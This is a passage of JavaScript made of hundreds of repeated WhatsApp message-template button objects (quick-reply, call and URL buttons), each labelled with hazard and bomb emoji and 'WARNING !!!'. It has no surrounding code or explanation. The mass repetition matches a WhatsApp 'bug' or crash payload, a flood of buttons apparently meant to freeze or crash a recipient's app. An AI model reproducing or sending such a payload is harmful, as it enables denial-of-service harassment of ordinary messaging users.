{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
